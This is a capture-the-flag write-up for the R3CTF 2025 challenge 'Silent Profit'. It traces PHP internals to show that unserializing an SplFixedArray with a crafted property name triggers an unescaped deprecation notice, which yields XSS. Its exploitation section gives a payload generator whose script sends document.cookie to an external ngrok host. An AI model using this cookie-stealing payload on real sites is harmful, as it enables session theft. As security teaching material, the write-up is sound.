# Silent Profit

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
  - [Explore Functionalities](#explore-functionalities)
  - [Source Code Review](#source-code-review)
  - [Insecure Deserialization Without Gadget?](#insecure-deserialization-without-gadget)
  - [PHP Universal XSS Gadget (If Error Reporting Is On)](#php-universal-xss-gadget--if-error-reporting-is-on)
    - [Do Not Use `zend_error`?](#do-not-use-zend-error)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @m0z, @Masamune, @four0four, @stefanelul
- Solved by: @irogir
- 56 solves / 200 points
- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

🔇

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250707142708.png)

## Enumeration

### Explore Functionalities

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250706190558.png)

In here, we are just met with 2 lines of PHP code and some error messages.

### Source Code Review

Based on the PHP code, it seems like we'll need to provide GET parameter `data`, which will then get [`unserialize`](https://www.php.net/manual/en/function.unserialize.php)'d:

```php
<?php 
show_source(__FILE__);
unserialize($_GET['data']);
```

In this challenge, we can download a file:

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.06|19:12:21(HKT)]
└> file web-silent-profit.zip        
web-silent-profit.zip: Zip archive data, at least v2.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.06|19:12:23(HKT)]
└> unzip web-silent-profit.zip 
Archive:  web-silent-profit.zip
   creating: web-silent-profit/
   creating: web-silent-profit/bot/
  inflating: web-silent-profit/bot/bot.js  
  inflating: web-silent-profit/bot/Dockerfile  
  inflating: web-silent-profit/bot/package-lock.json  
  inflating: web-silent-profit/bot/package.json  
  inflating: web-silent-profit/docker-compose.yml  
   creating: web-silent-profit/html/
  inflating: web-silent-profit/html/index.php  
```

After reading those files a little bit, it has 2 services, which are `challenge` and `xxsbot`, they are defined in `web-silent-profit/docker-compose.yml`:

```yaml
services:
  challenge:
    image: php:8-apache
    ports:
      - 8080:80
    volumes:
      - ./html/:/var/www/html
    restart: unless-stopped

  xssbot:
    build:
      context: ./bot
      dockerfile: Dockerfile
    ports:
      - 31337:31337
    working_dir: /app
    command: node /app/bot.js
    environment:
      - FLAG=r3ctf{test_flag}
    restart: unless-stopped
```

In service `challenge`, the source code is just those 2 lines of PHP code in the above. So, let's take a look at service `xssbot`!

In this service, it'll run command `node /app/bot.js` after the Docker image has been built. Let's read its source code!

```javascript
const express = require('express');
[...]
const app = express();
[...]
const PORT = process.env?.BOT_PORT || 31337;
[...]
app.use(express.urlencoded({ extended: false }));
[...]
app.post('/report', async (req, res) => {
  [...]
});
[...]
app.listen(PORT, () => {
  console.log(`XSS bot running at port ${PORT}`);
});
```

In here, it'll start an HTTP server on port 31337 using framework [Express.js](https://expressjs.com/). It has 2 routes, where POST route `/report` is the most important.

In this route, it'll first check if the POST parameter `url` is start with `http://challenge/` or not. If it's not, it'll return HTTP status code `400`:

```javascript
app.post('/report', async (req, res) => {
  const { url } = req.body;

  if (!url || !url.startsWith('http://challenge/')) {
    return res.status(400).send('Invalid URL');
  }
  [...]
});
```

After validating the `url` parameter, it'll launch a [headless Chrome browser](https://developer.chrome.com/docs/chromium/headless) without sandboxing using library [Puppeteer](https://pptr.dev/):

```javascript
const puppeteer = require('puppeteer');
[...]
app.post('/report', async (req, res) => {
  [...]
  try {
    console.log(`[+] Visiting: ${url}`);
    const browser = await puppeteer.launch({
      headless: 'new',
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
      ]
    });
    [...]
  } catch (err) {
    [...]
  }
});
```

After that, it'll set a new cookie named `flag` with the value of the `FLAG` environment variable. This cookie is set to domain `challenge`. Then, it'll open a new page, visit our `url` parameter's value for 5 seconds, and close the browser:

```javascript
const flag = process.env['FLAG'] ?? 'flag{test_flag}';
[...]
app.post('/report', async (req, res) => {
  [...]
  try {
    [...]
    await browser.setCookie({ name: 'flag', value: flag, domain: 'challenge' });
    const page = await browser.newPage();
    await page.goto(url, { waitUntil: 'networkidle2', timeout: 5000 });
    await page.waitForNetworkIdle({timeout: 5000})
    await browser.close();
    res.send('URL visited by bot!');
  } catch (err) {
      [...]
  }
});
```

With that said, we need to somehow find a client-side vulnerability, usually XSS (Cross-Site Scripting), to get the bot's `flag` cookie and exfiltrate it to our attacker server.

Since we can only provide URL like `http://challenge/`, we'll need to find such vulnerability in the `challenge` service.

> Note: In Docker, service name like `challenge` will be resolved into an IP address by Docker internal DNS resolver.

### Insecure Deserialization Without Gadget?

At the very beginning, we know that `web-silent-profit/html/index.php` only contains these 2 lines of PHP code:

```php
<?php 
show_source(__FILE__);
unserialize($_GET['data']);
```

According to [PHP's documentation about function `unserialize`](https://www.php.net/manual/en/function.unserialize.php), we can see this big warning:

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250706193458.png)

Since we can control the deserialized (Unserialized) data, the above code is vulnerable to insecure deserialization, or in PHP world, it's called PHP object injection. For more details about this vulnerability class, you can take a look at [this amazing learning material from PortSwigger Web Security Academy](https://portswigger.net/web-security/deserialization).

However, there's no other gadgets that we can use!

> A "gadget" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. - [https://portswigger.net/web-security/deserialization/exploiting#gadget-chains](https://portswigger.net/web-security/deserialization/exploiting#gadget-chains)

Since our goal is to achieve XSS, maybe there are some built-in gadgets in PHP that we can use?

If we Google something like "php unserialize xss", we'll find [this Chinese article](https://blog.csdn.net/qq_45521281/article/details/105812056).

In that article, the example vulnerable code is like this:

```php
<?php
$a = unserialize($_GET['yds']);
echo $a;
?>
```

In PHP, if it `echo`s an object, it'll try to convert it into a string by calling [magic method](https://www.php.net/manual/en/language.oop5.magic.php) [`__toString`](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring). Luckily, there are some built-in classes have implemented `__toString` magic method. For example, [class `Error`](https://www.php.net/manual/en/class.error.php) has implemented its own `__toString` magic method: [https://www.php.net/manual/en/error.tostring.php](https://www.php.net/manual/en/error.tostring.php).

Therefore, it is possible to achieve XSS in above vulnerable example using this serialized object string:

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.06|20:06:00(HKT)]
└> php -a
[...]
php > echo serialize(new Error('<script>alert(document.domain)</script>'));
O:5:"Error":7:{s:10:"*message";s:39:"<script>alert(document.domain)</script>";s:13:"Errorstring";s:0:"";s:7:"*code";i:0;s:7:"*file";s:14:"php shell code";s:7:"*line";i:1;s:12:"Errortrace";a:0:{}s:15:"Errorprevious";N;}
```

But wait a minute... The deserialized result is not `echo`ed in this challenge! How can we achieve XSS then?

### PHP Universal XSS Gadget (If Error Reporting Is On)

If we recall from the beginning, we can see that there are some error messages if we didn't provide any parameter:

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250706201055.png)

According to PHP documentation, the [`error_reporting`](https://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting) configuration option's default value [`E_ALL`](https://www.php.net/manual/en/errorfunc.constants.php#constant.e-all), which shows every single error, warning, and notice. In Docker image [`php:8-apache`](https://hub.docker.com/layers/library/php/8-apache/images/sha256-4e97cb42a25019c4e8ceec170a46984f63079f5b371d24e23a41f5397934ea31), that option didn't get changed. Therefore, it'll show all error messages.

Now, let's ask ourselves with this question: *Is it possible to achieve XSS via error messages from function `unserialize`?*

If we Google something like "php unserialize error message", we should be able to find this PHP RFC, [PHP RFC: Improve unserialize() error handling](https://wiki.php.net/rfc/improve_unserialize_error_handling).

In the "[Introduction](https://wiki.php.net/rfc/improve_unserialize_error_handling#introduction)" section, we can see some error message examples, like these:

```php 
unserialize('foo'); // Notice: unserialize(): Error at offset 0 of 3 bytes in php-src/test.php on line 3
unserialize('i:12345678901234567890;'); // Warning: unserialize(): Numerical result out of range in php-src/test.php on line 4
unserialize('E:3:"foo";'); // Warning: unserialize(): Invalid enum name 'foo' (missing colon) in php-src/test.php on line 5
                           // Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 5
unserialize('E:3:"fo:";'); // Warning: unserialize(): Class 'fo' not found in php-src/test.php on line 7
                           // Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 7
```

Since we want to control the error message, these 2 stick out the most:

```php
unserialize('E:3:"foo";'); // Warning: unserialize(): Invalid enum name 'foo' (missing colon) in php-src/test.php on line 5
                           // Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 5
unserialize('E:3:"fo:";'); // Warning: unserialize(): Class 'fo' not found in php-src/test.php on line 7
                           // Notice: unserialize(): Error at offset 0 of 10 bytes in php-src/test.php on line 7
```

Let's try them!

```python
xssPayload = '<script>alert(document.domain)</script>'
serializedObjectString = f'E:{len(xssPayload)}:"{xssPayload}";'
print(serializedObjectString)
```

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.06|20:38:14(HKT)]
└> python3 solve.py 
E:39:"<script>alert(document.domain)</script>";
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250706204034.png)

Uhh? Doesn't seem to work?

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.06|20:39:50(HKT)]
└> curl http://s1.r3.ret.sh.cn:30109/\?data\=E:39:%22%3Cscript%3Ealert\(document.domain\)%3C/script%3E%22\;                           [...]
<b>Warning</b>:  unserialize(): Invalid enum name '&lt;script&gt;alert(document.domain)&lt;/script&gt;' (missing colon) in <b>/var/www/html/index.php</b> on line <b>3</b><br />
[...]
```

Of course, PHP should HTML entity encode the error message... Right?

To verify PHP really does HTML entity encode the error messages, we should dive deeper into PHP source code.

But before that, we'll need to make sure we are reading the same PHP version of the challenge one. In [Docker image php:8-apache](https://hub.docker.com/layers/library/php/8-apache/images/sha256-4e97cb42a25019c4e8ceec170a46984f63079f5b371d24e23a41f5397934ea31), we can see that the PHP version is 8.4.10:

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250706204633.png)

With that said, let's read [version 8.4.10's PHP source code](https://github.com/php/php-src/tree/PHP-8.4.10)! (Branch `PHP-8.4.10`)

If we search for error message `Invalid enum name`, we can see it in [`ext/standard/var_unserializer.re` line 1373](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re#L1373):

```c
[...]
"E:" uiv ":" ["] {
	[...]
	char *colon_ptr = memchr(str, ':', len);
	if (colon_ptr == NULL) {
		php_error_docref(NULL, E_WARNING, "Invalid enum name '%.*s' (missing colon)", (int) len, str);
		return 0;
	}
```

In here, it calls function `php_error_docref`. If we [search for this function](https://github.com/search?q=repo%3Aphp%2Fphp-src+symbol%3Aphp_error_docref&type=code), it is defined in [`main/main.c` line 1173 - 1176](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L1173-L1176):

```c
PHPAPI ZEND_COLD void php_error_docref(const char *docref, int type, const char *format, ...)
{
	php_error_docref_impl(docref, type, format);
}
```

Which calls [marco](https://www.geeksforgeeks.org/c/macros-and-its-types-in-c-cpp/) [`php_error_docref_impl`](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L1164-L1171):

```c
/* {{{ php_error_docref */
/* Generate an error which links to docref or the php.net documentation if docref is NULL */
#define php_error_docref_impl(docref, type, format) do {\
		va_list args; \
		va_start(args, format); \
		php_verror(docref, "", type, format, args); \
		va_end(args); \
	} while (0)
```

In function [`php_verror`](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L992), it'll first format the error message's string and store it in pointer variable `buffer`, which will then passed to function `escape_html`:

```c
PHPAPI ZEND_COLD void php_verror(const char *docref, const char *params, int type, const char *format, va_list args)
{
	[...]
	/* get error text into buffer and escape for html if necessary */
	zend_string *buffer = vstrpprintf(0, format, args);

	if (PG(html_errors)) {
		zend_string *replace_buffer = escape_html(ZSTR_VAL(buffer), ZSTR_LEN(buffer));
		zend_string_free(buffer);

		if (replace_buffer) {
			buffer = replace_buffer;
		} else {
			buffer = zend_empty_string;
		}
	}
	[...]
}
```

If we look at function [`escape_html`](https://github.com/php/php-src/blob/PHP-8.4.10/main/main.c#L973-L984), it'll call function [`php_escape_html_entities_ex`](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/html.c#L1099) with the above `buffer` as the argument:

```c
static zend_string *escape_html(const char *buffer, size_t buffer_len) {
	zend_string *result = php_escape_html_entities_ex(
		(const unsigned char *) buffer, buffer_len, 0, ENT_COMPAT,
		/* charset_hint */ NULL, /* double_encode */ 1, /* quiet */ 1);
	if (!result || ZSTR_LEN(result) == 0) {
		/* Retry with substituting invalid chars on fail. */
		result = php_escape_html_entities_ex(
			(const unsigned char *) buffer, buffer_len, 0, ENT_COMPAT | ENT_HTML_SUBSTITUTE_ERRORS,
			/* charset_hint */ NULL, /* double_encode */ 1, /* quiet */ 1);
	}
	return result;
}
```

As the function name suggested, it'll perform HTML entity encoding. Therefore, function `php_error_docref` will automatically HTML entity encode the error message! 

Hmm... Are there any error messages that are **not** displayed by function `php_error_docref`?

If we search function names that contain the word `error` and exclude function `php_error_docref` in [`ext/standard/var_unserializer.re`](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re), we can find these 2 function names:

```c
zend_throw_error
zend_error
```

#### Do Not Use `zend_error`?

According to [PHP's common comments from reviewing PECL proposals](https://wiki.php.net/internals/review_comments), we can see this section:

> zend_error() should only be used inside the engine. Inside PHP extensions only PHP's error functions [should] be used. Typically php_error_docref() is the best choice. **php_error_docref() will extend the error message by extra information, like the current function name and properly escape output where needed**. - [https://wiki.php.net/internals/review_comments#don_t_use_zend_error](https://wiki.php.net/internals/review_comments#don_t_use_zend_error)

With that said, function `zend_error` will not HTML entity encode the error message. We can confirm this by reading its implementation in [`Zend/zend.c`](https://github.com/php/php-src/blob/PHP-8.4.10/Zend/zend.c#L1666-L1668):

```c
ZEND_API ZEND_COLD void zend_error(int type, const char *format, ...) {
	zend_error_impl(type, format);
}
```

[line 1656 - 1664](https://github.com/php/php-src/blob/PHP-8.4.10/Zend/zend.c#L1656-L1664):

```c
#define zend_error_impl(type, format) do { \
		zend_string *filename; \
		uint32_t lineno; \
		va_list args; \
		get_filename_lineno(type, &filename, &lineno); \
		va_start(args, format); \
		zend_error_va_list(type, filename, lineno, format, args); \
		va_end(args); \
	} while (0)
```

In function [`zend_error_va_list`](https://github.com/php/php-src/blob/PHP-8.4.10/Zend/zend.c#L1592-L1599), the error message's format string didn't get HTML entity encoded nor in function `zend_error_zstr_at`:

```c
static ZEND_COLD void zend_error_va_list(
		int orig_type, zend_string *error_filename, uint32_t error_lineno,
		const char *format, va_list args)
{
	zend_string *message = zend_vstrpprintf(0, format, args);
	zend_error_zstr_at(orig_type, error_filename, error_lineno, message);
	zend_string_release(message);
}
```

Therefore, it is possible to achieve XSS if the error message is displayed from function `zend_error`. After searching for controllable error message, this one sticks out the most: [`ext/standard/var_unserializer.re` line 649](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re#L649)

```c
static zend_always_inline int process_nested_object_data(UNSERIALIZE_PARAMETER, HashTable *ht, zend_long elements, zend_object *obj)
{
    [...]
    while (elements-- > 0) {
		[...]
		if ([...]) {
string_key:
			[...]
			if ([...]) {
				[...]
			} else {
				int ret = is_property_visibility_changed(obj->ce, &key);

				if (EXPECTED(!ret)) {
					if ([...]) {
						[...]
					} else if (!(obj->ce->ce_flags & ZEND_ACC_ALLOW_DYNAMIC_PROPERTIES)) {
						zend_error(E_DEPRECATED, "Creation of dynamic property %s::$%s is deprecated",
							ZSTR_VAL(obj->ce->name), zend_get_unmangled_property_name(Z_STR_P(&key)));
                        [...]
					}
                    [...]
				} else if ([...]) {
					[...]
				} else {
                    [...]
                }
                [...]
            }
        [...]
	}
    [...]
}
```

Therefore, if we are able to trigger error `Creation of dynamic property %s::$%s is deprecated`, then we should be able to achieve XSS, as function `zend_error` will not perform HTML entity encoding on the error message. (https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re#L649)

Hmm... What's that dynamic property?

According to [this PHP.Watch post](https://php.watch/versions/8.2/dynamic-properties-deprecated), PHP classes can dynamically set and get class properties that are not declared in the class. However, from PHP version 8.2 and onwards, **setting a value to an undeclared class property is deprecated**. Here's a simple example:

```shell
[...]
php > class Foo {}
php > $foo = new Foo();
php > $foo->hello = 'world';

Deprecated: Creation of dynamic property Foo::$hello is deprecated in php shell code on line 1
```

Also, setting the properties from **within the class** also emits the deprecation notice:

```shell
[...]
php > class Foo {
    function __construct() {
        $this->hello = 'world';
    }
}
new Foo();

Deprecated: Creation of dynamic property Foo::$hello is deprecated in php shell code on line 3
```

```shell
[...]
php > class Foo {
    function __construct($world) {
        $this->hello = $world;
    }
}
new Foo('world');

Deprecated: Creation of dynamic property Foo::$hello is deprecated in php shell code on line 3
```

In short, if we somehow set an undeclared property to a class or the class sets its own properties, PHP will emit the deprecation notice.

Hmm... I don't know how you can do the first one using `unserialize` unless there are some gadgets we can use, but the latter one seems more common.

Since after `unserialize`'ing an object will call magic method `__wakeup` ([`ext/standard/var_unserializer.re` line 278](https://github.com/php/php-src/blob/PHP-8.4.10/ext/standard/var_unserializer.re#L278)), we can try to find all classes that have implemented that method.

After searching such classes, we can find class `SplFixedArray` has an interesting `__wakeup` magic method implementation. ([`ext/spl/spl_fixedarray.c` line 565 - 590](https://github.com/php/php-src/blob/PHP-8.4.10/ext/spl/spl_fixedarray.c#L565-L590))

First, function `zend_std_get_properties` will get all the properties of the `SplFixedArray` object as a `HashTable` type. After that, the if statement will check if the size of the internal array (`intern`) in the `SplFixedArray` object being unserialized is 0:

```c
PHP_METHOD(SplFixedArray, __wakeup)
{
	spl_fixedarray_object *intern = Z_SPLFIXEDARRAY_P(ZEND_THIS);
	HashTable *intern_ht = zend_std_get_properties(Z_OBJ_P(ZEND_THIS));
	zval *data;
	
	if (intern->array.size == 0) {
		[...]
	}
}
```

If it is, it initializes the `SplFixedArray` object with the appropriate size based on the number of elements in the properties of the object:

```c
PHP_METHOD(SplFixedArray, __wakeup)
{
	[...]
	if (intern->array.size == 0) {
		int index = 0;
		int size = zend_hash_num_elements(intern_ht);

		spl_fixedarray_init(&intern->array, size);
		[...]
	}
}
```

Next, it iterates over each object properties in `intern_ht` using a `ZEND_HASH_FOREACH_VAL` loop. For each property, it copies the value into the corresponding index of the `elements` array within the `SplFixedArray` object:

```c
PHP_METHOD(SplFixedArray, __wakeup)
{
	[...]
	if (intern->array.size == 0) {
		[...]
		ZEND_HASH_FOREACH_VAL(intern_ht, data) {
			ZVAL_COPY(&intern->array.elements[index], data);
			index++;
		} ZEND_HASH_FOREACH_END();
        [...]
	}
}
```

TL;DR: When an `SplFixedArray` object is unserialized, the elements stored in the object's properties are moved into the internal fixed-size array of the object.

Does that sound familiar? It's basically setting the properties from **within the class**!

Since we can control the property name during deserialization, we can craft the following serialized object string:

```php
O:13:"SplFixedArray":1:{s:3:"foo";N;}
```

- `O:13:"SplFixedArray"`: An object named `SplFixedArray`, and its object name is `13` characters long
- `:1:`: The object has `1` property
- `{s:3:"foo";N;}`: Property `foo` is a string (`s`) and it is `3` characters long. The value of this property is `null` (`N`).

If we try to deserialize and dump it, we will see this structure:

```shell
php > var_dump(unserialize('O:13:"SplFixedArray":1:{s:3:"foo";N;}'));
[...]
object(SplFixedArray)#1 (1) {
  ["foo"]=>
  NULL
}
```

Now, what if we try to do the same thing in the web application?

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250707140800.png)

Nice! It emitted the deprecation notice!

Let's change the property name into an XSS payload!

```php
O:13:"SplFixedArray":1:{s:39:"<script>alert(document.domain)</script>";N;}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250707140941.png)

We now achieved XSS!

## Exploitation

Armed with above information, we can get the flag by:

- Setup our own HTTP server:

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.07|14:11:55(HKT)]
└> python3 -m http.server 8000 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

- Setup port forwarding with [ngrok](https://ngrok.com/):

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.07|14:12:46(HKT)]
└> ngrok tcp 8000           
[...]
Forwarding                    tcp://0.tcp.jp.ngrok.io:16499 -> localhost:8000                             
[...]
```

- Send the following serialized object string to the bot, which exfiltrate the `flag` cookie to our attacker server:

Payload generator:

```python
from urllib.parse import quote_plus

xssPayload = '<script>fetch(`//0.tcp.jp.ngrok.io:16499/?${document.cookie}`)</script>'

serializedObjectString = f'O:13:"SplFixedArray":1:{{s:{len(xssPayload)}:"{xssPayload}";N;}}'
print(f'Serialized object string: {serializedObjectString}')
print(f'Serialized object string (URL encoded): {quote_plus(serializedObjectString)}')
```

Serialized object string:

```shell
┌[siunam♥Mercury]-(~/ctf/R3CTF-2025/Web/Silent-Profit)-[2025.07.07|14:18:53(HKT)]
└> python3 solve.py
Serialized object string: O:13:"SplFixedArray":1:{s:71:"<script>fetch(`//0.tcp.jp.ngrok.io:16499/?${document.cookie}`)</script>";N;}
Serialized object string (URL encoded): O%3A13%3A%22SplFixedArray%22%3A1%3A%7Bs%3A71%3A%22%3Cscript%3Efetch%28%60%2F%2F0.tcp.jp.ngrok.io%3A16499%2F%3F%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E%22%3BN%3B%7D
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/R3CTF-2025/images/Pasted%20image%2020250707142136.png)

```shell
[...]
127.0.0.1 - - [07/Jul/2025 14:21:41] "GET /?flag=r3ctf{test_flag} HTTP/1.1" 200 -
```

Nice!!

## Conclusion

What we've learned:

1. PHP universal insecure deserialization XSS gadget